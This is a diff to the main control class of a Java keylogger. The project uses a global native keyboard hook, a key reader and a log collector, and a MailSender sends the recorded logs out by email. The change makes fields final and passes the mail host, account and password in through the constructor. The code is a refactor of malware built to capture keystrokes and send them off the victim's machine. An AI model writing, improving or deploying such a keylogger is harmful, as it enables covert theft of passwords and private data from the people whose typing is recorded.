@@ -5,28 +5,27 @@ import com.mossad.keylogger.logging.LogRecorder;
 import com.mossad.keylogger.mail.MailSender;
 import com.mossad.keylogger.reader.KeyReader;
 import com.mossad.keylogger.timer.WriterTask;
+import org.apache.commons.mail.EmailException;
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
 
 import java.util.List;
 import java.util.Timer;
 import java.util.logging.Logger;
 
-import org.apache.commons.mail.EmailException;
-import org.jnativehook.GlobalScreen;
-import org.jnativehook.NativeHookException;
-
 public final class LogicFlow {
 
     private final Logger LOG = Logger.getLogger(LogicFlow.class.getCanonicalName());
-    private Timer timer;
+    private final Timer timer;
     private WriterTask writerTask;
-    private KeyReader keyReader;
-    private MailSender mailSender;
-    private LogFilesCollector logFilesCollector;
+    private final KeyReader keyReader;
+    private final MailSender mailSender;
+    private final LogFilesCollector logFilesCollector;
     private List<String> files;
 
-    public LogicFlow() {
+    public LogicFlow(String mailHostName, String emailAccount, String password) {
         logFilesCollector = new LogFilesCollector();
-        mailSender = new MailSender();
+        mailSender = new MailSender(mailHostName, emailAccount, password);
         timer = new Timer();
         keyReader = new KeyReader();
     }
